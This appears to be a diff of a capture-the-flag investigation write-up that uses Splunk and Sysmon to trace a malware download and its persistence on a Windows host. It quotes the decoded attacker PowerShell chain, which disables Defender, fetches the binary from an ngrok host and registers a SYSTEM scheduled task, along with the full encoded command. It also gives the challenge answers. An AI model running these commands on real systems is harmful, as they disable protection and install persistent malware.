@@ -16,7 +16,7 @@ Happy Hunting!
 
 ## Questions:
 
-## 1) A suspicious binary was downloaded to the endpoint. What was the name of the binary?
+## A suspicious binary was downloaded to the endpoint. What was the name of the binary?
 
 > OUTSTANDING_GUTTER.exe
 
@@ -89,3 +89,81 @@ I decoded the encoded command using CyberChef.
 After decoding, I found the original PowerShell command, which contained the URL used to download the malicious executable.Using the decoded command, I was able to identify the address from where the binary was downloaded.
 
 ---
+
+## What Windows executable was used to download the suspicious binary? Enter full path.
+
+> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+**Explaination:**
+
+To identify which Windows executable was used to download the suspicious binary, I reviewed the events related to OUTSTANDING_GUTTER.exe.
+
+From the previous investigation, I found a file creation event showing that the executable was created in the Temp directory.
+
+The event also showed the associated process image responsible for the activity:
+
+`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+
+This indicates that PowerShell was used to download and create the suspicious executable on the system.
+
+---
+
+## What command was executed to configure the suspicious binary to run with elevated privileges?
+
+> "C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
+
+Where we can see the command is from the decoded PowerShell command. After decoding the encoded PowerShell payload, I found the command used to configure the suspicious binary to run with elevated privileges.
+
+The following command was present in the decoded payload:
+
+`Set-MpPreference -DisableRealtimeMonitoring $true;`<br>
+This command disables Microsoft Defender real-time protection to reduce the chance of the malware being detected during execution.
+
+`wget http://886e-181-215-214-32.ngrok[.]io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;`. <br>
+This command downloads the malicious executable from the remote server and stores it.
+
+`SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\OUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;`<br>
+This command creates a scheduled task named.
+The task is also configured to: Run as SYSTEM (highest privilege!) , Force create, no questions asked
+
+`SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`<br>
+This command immediately runs the scheduled task, causing the malware to execute on the endpoint.
+
+---
+
+## What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)
+
+ > NT AUTHORITY\SYSTEM;”C:\Windows\system32\schtasks.exe” /Run /TN OUTSTANDING_GUTTER.exe
+
+**Explaination :**
+To find the command executed with elevated privileges, I searched Sysmon EventCode=1 (Process Creation), filtering by ParentCommandLine containing the encoded PowerShell command.
+```
+index="*" EventCode=1 ParentCommandLine="powershell.exe  -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA" ComputerName="DESKTOP-TBV8NEF"
+| table _time,CommandLine,ParentCommandLine
+```
+
+This revealed that PowerShell spawned schtasks.exe as a child process with the command:
+`C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe` </br>
+<img width="544" height="244" alt="image" src="https://github.com/user-attachments/assets/3ca30be1-bd71-4602-b02e-615c7f869dc6" /> </br>
+
+The parent process being the encoded PowerShell confirms this was part of the malicious payload.
+
+The binary ran as NT AUTHORITY\SYSTEM — confirmed by /RU SYSTEM in the /Create command.
+
+---
+The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
+> hxxp[://]9030-181-215-214-32[.]ngrok[.]io
+
+
+```
+index="*"  Image="C:\\Windows\\Temp\\OUTSTANDING_GUTTER.exe" TaskCategory="Dns query (rule: DnsQuery)"
+| table QueryName
+```
+To identify the remote server the binary connected to, I searched for DNS query events (TaskCategory="Dns query (rule: DnsQuery)") generated specifically by OUTSTANDING_GUTTER.exe. The QueryName field revealed the domain name the malicious binary attempted to resolve, confirming it connected.
+
+
+
+
+
+
+
